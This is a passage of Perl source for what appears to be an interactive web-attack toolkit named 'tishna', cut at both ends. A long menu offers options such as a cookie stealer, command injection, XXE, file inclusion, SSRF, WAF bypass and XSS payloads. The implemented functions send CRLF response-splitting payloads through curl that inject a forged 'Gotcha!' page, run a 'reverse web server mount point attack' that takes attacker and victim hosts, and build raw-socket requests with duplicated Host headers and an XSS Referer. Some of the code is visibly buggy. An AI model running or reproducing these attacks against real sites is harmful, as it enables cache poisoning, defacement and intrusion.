        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($headerinjectpoison=<STDIN>);
        print "\n";
        Headerinjectpoison();
        enter();
     }if($number eq '10'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($cachepoisondefacer=<STDIN>);
        print "\n";
        Cachepoisondefacer();
        enter();
    }if($number eq '11'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($crlfrsaf=<STDIN>);
        print "\n";
        Crlfrsaf();
        enter();
    }if($number eq '12'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($httprsf=<STDIN>);
        print "\n";
        Httprsf();
        enter();
    }if($number eq '13'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($wcdac=<STDIN>);
        print "\n";
        Wcdac();
        enter();
    }if($number eq '14'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($httpmethodsinformation=<STDIN>);
        print "\n";
        Httpmethodsinformation();
        enter();        
    }if($number eq '15'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($csrfinjection=<STDIN>);
        print "\n";
        Csrfinjection();
        enter(); 
    }if($number eq '16'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($loadcsrfhtmltemplates=<STDIN>);
        print "\n";
        Loadcsrfhtmltemplates();
        enter();        
    }if($number eq '17'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($shellshock=<STDIN>);
        print "\n";
        Shellshock();
        enter();        
    }if($number eq '18'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($csrfat=<STDIN>);
        print "\n";
        Csrfat();
        enter();
    }if($number eq '19'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($fahttpm=<STDIN>);
        print "\n";
        Fahttpm();
        enter();
    }if($number eq '20'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($findxssinparameters=<STDIN>);
        print "\n";
        Findxssinparameters();
        enter();
    }if($number eq '21'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($findmissinghttpsmethods=<STDIN>);
        print "\n";
        Findmissinghttpsmethods();
        enter();
    }if($number eq '22'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($ssrf=<STDIN>);
        print "\n";
        Ssrf();
        enter();
    }if($number eq '23'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($fahttpsmethods=<STDIN>);
        print "\n";
        Fahttpsmethods();
        enter();
    }if($number eq '24'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($auditxmlrpc=<STDIN>);
        print "\n";
        Auditxmlrpc();
        enter();
    }if($number eq '25'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($cookiestealer=<STDIN>);
        print "\n";
        Cookiestealer();
        enter();
    }if($number eq '26'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($commandinection=<STDIN>);
        print "\n";
        Commandinection();
        enter();
    }if($number eq '27'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($showjson=<STDIN>);
        print "\n";
        Showjson();
        enter();
    }if($number eq '28'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($blindxxeinjection=<STDIN>);
        print "\n";
        Blindxxeinjection();
        enter();
    }if($number eq '29'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($fileupload=<STDIN>);
        print "\n";
        Fileupload();
        enter();
    }if($number eq '30'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($pssti=<STDIN>);
        print "\n";
        Pssti();
        enter();
    }if($number eq '31'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($jsonwebtoken=<STDIN>);
        print "\n";
        Jsonwebtoken();
        enter();
    }if($number eq '32'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($pwebsocket=<STDIN>);
        print "\n";
        Pwebsocket();
        enter();
    }if($number eq '33'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($amazonbucket=<STDIN>);
        print "\n";
        Amazonbucket();
        enter();
    }if($number eq '34'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($extractcname=<STDIN>);
        print "\n";
        Extractcname();
        enter();
    }if($number eq '35'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($idorburp=<STDIN>);
        print "\n";
        Idorburp();
        enter();
    }if($number eq '36'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($performcsv=<STDIN>);
        print "\n";
        Performcsv();
        enter();
    }if($number eq '37'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($pxpath=<STDIN>);
        print "\n";
        Pxpath();
        enter();
    }if($number eq '38'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($findbugs=<STDIN>);
        print "\n";
        Findbugs();
        enter();
    }if($number eq '39'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($xpathsql=<STDIN>);
        print "\n";
        Xpathsql();
        enter();
    }if($number eq '40'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($ffa=<STDIN>);
        print "\n";
        Ffa();
        enter();
    }if($number eq '41'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($wafbypass=<STDIN>);
        print "\n";
        Wafbypass();
        enter();
    }if($number eq '42'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($storedxsspayloads=<STDIN>);
        print "\n";
        Storedxsspayloads();
        enter();
    }if($number eq '43'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($reflectedxsspayloads=<STDIN>);
        print "\n";
        Reflectedxsspayloads();
        enter();
    }if($number eq '44'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($wafbypass=<STDIN>);
        print "\n";
        Wafbypass();
        enter();
    }if($number eq '45'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($findxxsrs=<STDIN>);
        print "\n";
        Findxxsrs();
        enter();
    }if($number eq '46'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($extractlinksa=<STDIN>);
        print "\n";
        Extractlinksa();
        enter();
    }if($number eq '47'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($downloadlinksexif=<STDIN>);
        print "\n";
        Downloadlinksexif();
        enter();
    }if($number eq '48'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($simplersa=<STDIN>);
        print "\n";
        Simplersa();
        enter();
    }if($number eq '49'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($doublersa=<STDIN>);
        print "\n";
        Doublersa();
        enter();
    }if($number eq '50'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($httpcachepoison=<STDIN>);
        print "\n";
        Httpcachepoison();
        enter();
    }if($number eq '51'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($httpcacheinject=<STDIN>);
        print "\n";
        Httpcacheinject();
        enter();
    }if($number eq '52'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($httpfuzzer=<STDIN>);
        print "\n";
        Httpfuzzer();
        enter();
    }if($number eq '53'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($ipobfuscating=<STDIN>);
        print "\n";
        Ipobfuscating();
        enter();
    }if($number eq '54'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($rfi=<STDIN>);
        print "\n";
        Rfi();
        enter();
     }if($number eq '55'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($lfi=<STDIN>);
        print "\n";
        Lfi();
        enter();
     }if($number eq '56'){
        banner();
        print line_u(),color('bold cyan'),"        #";print color('reset'),item(),"Enter Target Website in Absolute Format";print color('bold cyan'),"          #   \n",line_d();
        print color('bold green'),"\n\ntishna: _>  ";
        print color('bold white');
        chomp($banar=<STDIN>);
        print "\n";
        Banar();
        enter();
   }
      if($number eq '0'){
        exit;
   }
      else{
        banner();
        menu();
   }
}


#-----------------------------------------------#
# 1 Audit HTTP Methods                          #
#                                               #
#-----------------------------------------------#
sub Audit( ) {
my $mech = WWW::Mechanize->new(); # always define
$mech->get( $erh );
print color("BOLD RED"), "\n\n								[ + ] Printing HTTP Headers [ + ] \n\n";
#print color("BOLD RED"), "								====================== \n";
print color("reset");
$mech->dump_headers();
print "\n\n";
}



#-----------------------------------------------#
# 2 Extract Response Header                     #
#                                               #
#-----------------------------------------------#
sub Extractresponsesheader( ) {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
print color("BOLD RED"), "\n\n								[ + ] Checking OPTIONS method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = HTTP::Request->new(OPTIONS => $ei);
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
color("reset");
END { print color("reset") };
print color("reset");
print "\n\n";

print color("BOLD RED"), "\n								[ + ] Checking PUT method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = POST($ei, Content => [param => 'hello']);
$req->method('PUT');
say($req->as_string);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

print color("BOLD RED"), "\n								[ + ] Checking HEAD method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = HTTP::Request->new(HEAD => $ei);
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

print color("BOLD RED"), "\n								[ + ] Checking TRACE method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = HTTP::Request->new(TRACE => $ei);
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

print color("BOLD RED"), "\n								[ + ] Checking JEFF method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = HTTP::Request->new(JEFF => $ei);
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

print color("BOLD RED"), "\n								[ + ] Checking FOOBAR method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = HTTP::Request->new(FOOBAR => $ei);
my $res = $ua->request($req);
print $res->as_string (), "\n";
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";

print color("BOLD RED"), "\n								[ + ] Checking CATS method [ + ]  \n\n";
print color("BOLD RED"), "								=================================== \n";
print color("reset");
my $req = HTTP::Request->new(CATS => $ei);
my $res = $ua->request($req);
print $res->as_string (), "\n"; #show http request and response 
print "\n\n";
}



#-----------------------------------------------#
# 3 Extract Images                              #
#                                               #
#-----------------------------------------------#
sub Extractimages( ) {
my $mech = WWW::Mechanize->new(); # always define
$mech->get( $if );
$mech->dump_images();
print "\n\n";
 }


#-----------------------------------------------#
# 4 Extract Links                               #
#                                               #
#-----------------------------------------------#
sub Extracturls( ) {
my $mech = WWW::Mechanize->new(); # always define
$mech->get( $ecl ); # to get something, url means absolute url value
$mech->dump_links();
print "\n\n";
} 


#-----------------------------------------------#
# 5 Extract Forms                               #
#                                               #
#-----------------------------------------------#
sub Identifyform( ) {
my $mech = WWW::Mechanize->new(); # always define
$mech->get( $rsa );
print "\n";
$mech->dump_forms;
    print "\n\n";
}



#-----------------------------------------------#
# 6 Find XSS in Forms                           #
#                                               #
#-----------------------------------------------#
sub Findxssinforms( ) {
my $ua = LWP::UserAgent->new;
$ua->agent("Mozilla/5.0 (Windows NT 6.1; WOW64; rv:31.0) Gecko/20130401 Firefox/31.0.");
my $mech = WWW::Mechanize->new();
#my $checker = HTML::Form::XSS->new($mech, config => '/home/config.xml');
$mech->get( $drsa );
my @forms = $mech->forms();
foreach my $form (@forms){
	print item(), "Forms Identified \n";
	print "\n";
	print $form->dump();
	print "\n";
	print item(), "Test Identified Form Parameters (y/n): ";
	my $answer = <STDIN>;
	chomp $answer;
	if($answer ne "y"){
		next;
	}
	my $checker = HTML::Form::XSS->new($mech, config => '/home/config.xml');
	my @results = $checker->do_audit($form);
	my $vuln = 0;
	foreach my $result (@results){
		if($result->vulnerable()){
			$vuln = 1;
			my $example = $result->example();
			print item(),  "Identified Vulnerable Form(s) Payload URL: $example\n";
			last;
		}
	}
	if(!$vuln){
		print item(),"Form(s) Not Vulernable to Present XSS Payloads\n";
	}
}
print "\n\n";
};

#-----------------------------------------------#
# 7 Find XSS in Web                             #
#                                               #
#-----------------------------------------------#
sub Findxssinweb( ) {
     if (system("./xss.sh") == 0) {
	print item(),"success!\n";
	}
	else {
	print item(),"Make xss.sh available in same folder\n";
	print item(),"Command failed\n";
	}
}

#-----------------------------------------------#
# 8 Web Server Mount Response Splitting Attack  #
#                                               #
#-----------------------------------------------#
sub Wsmrsa( ) {
	print item(), "Caution: This attack requires two requirements\n";
	print item(), "Caution: First, website should redirects to one another and/or use frames\n";
	print item(), "Caution: Second, it must be a proxy environment\n\n";
	print item(),"1 - Perform Forward Web Server Mount Point Attack on Shared Hosting\n";
	print item(),"2 - Perform Reverse Web Server Mount Point Attack on Shared Hosting\n";
	print item(),"Enter Option: ";
	chomp($enter=<STDIN>);
	if ($enter =~1) {
	print item(), "Enter Target: ";
	chomp($Target=<STDIN>);
	print item(), "Enter Host: ";
	chomp($Host=<STDIN>);
	print item(), "Enter Redirect Path: ";
	chomp($Redirectpath=<STDIN>);
	print item(), "Enter Filename Path: ";
	chomp($filename=<STDIN>);
	print item(), "Performing Forward Server Mount Point Attack\n";
	sleep(2);
	system "curl -X GET -d '$Target$filename / HTTP/1.1
Pragma: no-cache
Host: $Host
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzipAccept-Language: enAccept-Charset: iso-8859-1,*,utf-8' -i '$Target'
";

	system "curl -X GET -d '$Target$Ridrectpath%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aLast-Modified:%20Mon,%2027%20Oct%202003%2014:50:18%20GMT%0d%0aContent-Length:%2020%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>Gotcha!</html> HTTP/1.1
Host: $Host
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzipAccept-Language: enAccept-Charset: iso-8859-1,*,utf-8' -i '$Target'";
	
		system "curl -X GET -d '$Target$filename / HTTP/1.1
Host: $Host
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzipAccept-Language: enAccept-Charset: iso-8859-1,*,utf-8' -i '$Target'
";
}
if ($enter =~2) {
	print item(), "Enter Script Name: ";
	chomp($scriptname=<STDIN>);
	print item(), "Enter Filename: ";
	chomp($filename=<STDIN>);
	print item(), "Enter Attacker info as a Host without www: ";
	chomp($hosta=<STDIN>);
	print item(), "Enter Victim";
	chomp($victim=<STDIN>);
	print item(), "Enter Attack";
	chomp($attacker=<STDIN>);
	print item(), "Enter Victim info as a Host without www: ";
	chomp($hostb=<STDIN>);
	print item(), "Performing Reverse Web Server Mount Point Attack\n";
	sleep(2);
	system "curl -X GET -d '/$scriptname HTTP/1.1
Host: www.$hosta
User-Agent: Mozilla/4.7 [en] (WinNT; I)
Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: enAccept-Charset: iso-8859-1,*,utf-8' -i '$victim'";

	system "curl -X GET -d 'GET /$filename HTTP/1.1
Host: www.$hostb
User-Agent: Mozilla/4.7 [en] (WinNT; I)Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*
Accept-Encoding: gzip
Accept-Language: en
Accept-Charset: iso-8859-1,*,utf-8' -i $attacker";
}
print item(), "Success!\n";
}



#-----------------------------------------------#
# 9 Header Inject Poison                        #
#                                               #
#-----------------------------------------------#
sub Headerinjectpoison ( ) {
	print "\n";
	print item(), "Caution\n";
	print item(), "Responses: 302 Found and 403 Forbidden (redirect)\n";
	print item(), "Payload should echo back in immediate response in any way\n";
	print item(), "This most likely mean the remote target is vulernable\n";
	print item(), "It is recommended to confirm the attack manually after these response are found\n";
	print item(), "Using Burp or Local Proxy as request in browser for current session option\n";
	print item(), "Option 3 - Target should reject request that doesn't originate from same origin otherwise it's an error\n";
	print item(), "For hosts behind HTTPS, use Local Proxy\n\n";
	print item(),"Select an Option \n";
	print item(),"1 - HTTP request using socket \n";
	print item(),"2 - HTTPS request using socket \n";
	print item(),"Enter Option: ";
	chomp($opt=<STDIN>);
	if ($opt =~1) {
	print item(),"Select an attack from templates \n";
	print item(),"1 - Perform Attack from Default Header Inject Poison\n";
	print item(),"2 - Perform Attack as Double Host Issue Bug\n";
	print item(),"3 - Perform Attack as Double Host with Proxy-Connection Issue Bug\n";
	print item(),"4 - Perform Attack on Injection/Redirection\n";
	print item(),"Enter Option: ";
	chomp($enter=<STDIN>);
	if ($enter =~1) {
	print item(), "Enter URL : ";
	chomp($url=<STDIN>);
	print item(), "Enter File Name: ";
	chomp($filename=<STDIN>);
	print item(), "Enter Host: ";
	chomp($host=<STDIN>);
	print "\n";
use IO::Socket;
my $sock = new IO::Socket::INET (
                                 PeerAddr => $url,
                                 PeerPort => '80',
                                 Proto => 'tcp',
                                );
die "Could not create socket: $!\n" unless $sock;
print $sock "GET $filename HTTP/1.0\r\n";
print $sock "Host: $host\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}
    
	if ($enter =~2) {
	print item(), "Enter URL : ";
	chomp($url=<STDIN>);
	print item(), "Enter File Name: ";
	chomp($filename=<STDIN>);	
	print item(), "Enter Host A: ";
	chomp($hosta=<STDIN>);
	print item(), "Enter Host B: ";
	chomp($hostb=<STDIN>);
	print "\n";
use IO::Socket;
my $sock = new IO::Socket::INET (
                                 PeerAddr => $url,
                                 PeerPort => '80',
                                 Proto => 'tcp',
                                );
die "Could not create socket: $!\n" unless $sock;
print $sock "GET $filename HTTP/1.0\r\n";
print $sock "Host: $hosta\r\n";
print $sock "Host: $hostb\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}

if ($enter =~3) {
	print item(), "Enter URL : ";
	chomp($url=<STDIN>);
	print item(), "Enter File Name: ";
	chomp($filename=<STDIN>);	
	print item(), "Enter Host A: ";
	chomp($hosta=<STDIN>);
	print item(), "Enter Host B: ";
	chomp($hostb=<STDIN>);
	print "\n";
use IO::Socket;
my $sock = new IO::Socket::INET (
                                 PeerAddr => $url,
                                 PeerPort => '80',
                                 Proto => 'tcp',
                                );
die "Could not create socket: $!\n" unless $sock;
print $sock "GET $filename HTTP/1.0\r\n";
print $sock "Host: $hosta\r\n";
print $sock "Host: $hostb\r\n";
print $sock "Proxy-Connection: keep-alive\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}
	
	if ($enter =~4) {
	print item(), "Enter URL: ";
	chomp($url=<STDIN>);
	print item(), "Enter Host: ";
	chomp($host=<STDIN>);
	print "\n";
use IO::Socket;
my $sock = new IO::Socket::INET (
                                 PeerAddr => $url,
                                 PeerPort => '80',
                                 Proto => 'tcp',
                                );
die "Could not create socket: $!\n" unless $sock;
print $sock "GET / HTTP/1.0\r\n";
print $sock "Host: $host\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}
}


if ($opt =~2) {
	print item(),"Select an attack from templates \n";
	print item(),"1 - Perform Attack from Default Header Inject Poison\n";
	print item(),"2 - Perform Attack as Double Host Issue Bug\n";
	print item(),"3 - Perform Attack as Double Host with Proxy-Connection Issue Bug\n";
	print item(),"4 - Perform Attack on Injection/Redirection\n";
	print item(),"Enter Option: ";
	chomp($enter=<STDIN>);
	if ($enter =~1) {
	print item(), "Enter URL : ";
	chomp($url=<STDIN>);
	print item(), "Enter File Name: ";
	chomp($filename=<STDIN>);
	print item(), "Enter Host: ";
	chomp($host=<STDIN>);
	print "\n";
use IO::Socket::SecureSocks;
my $socket = IO::Socket::SecureSocks->new(
                                ConnectAddr => $url,
								ConnectPort => 443,
								Timeout     => 10
                                ) or die "Could not create secure socket: $!\n" unless $sock;
print $sock "GET $filename HTTP/1.1\r\n";
print $sock "Host: $host\r\n";
print $sock "Accept: /\r\n\r\n";
print $sock "User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\n\r\n";
print $sock "Connection: close\r\n\r\n";
print $sock "Referer: 'http://www.google.com/search?hl=en&q=c5obc'+alert(1)+'p7yd5'\r\n\r\n";

print while <$sock>;
close($sock);
}
    
	if ($enter =~2) {
	print item(), "Enter URL : ";
	chomp($url=<STDIN>);
	print item(), "Enter File Name: ";
	chomp($filename=<STDIN>);	
	print item(), "Enter Host A: ";
	chomp($hosta=<STDIN>);
	print item(), "Enter Host B: ";
	chomp($hostb=<STDIN>);
	print "\n";
#use IO::Socket;
#my $sock = new IO::Socket::INET (
use IO::Socket::SecureSocks;
my $socket = IO::Socket::SecureSocks->new(
                                 PeerAddr => $url,
                                 PeerPort => '443',
                                 Proto => 'tcp',
                                 Timeout     => 10
